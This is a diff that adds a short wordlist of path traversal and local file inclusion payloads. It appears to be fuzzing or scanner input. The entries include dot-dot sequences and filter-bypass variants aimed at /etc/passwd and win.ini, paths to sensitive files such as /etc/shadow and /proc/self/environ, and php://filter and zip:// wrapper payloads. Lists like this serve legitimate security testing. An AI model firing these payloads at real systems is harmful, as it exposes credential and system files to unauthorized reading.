@@ -1,0 +1,17 @@
+../../../../../../../../etc/passwd
+../../../../../../../../windows/win.ini
+....//....//....//....//etc/passwd
+....\\....\\....\\....\\windows\\win.ini
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/motd
+/proc/self/environ
+/proc/version
+/proc/cmdline
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+file:///etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+zip://archive.zip#dir/file.txt
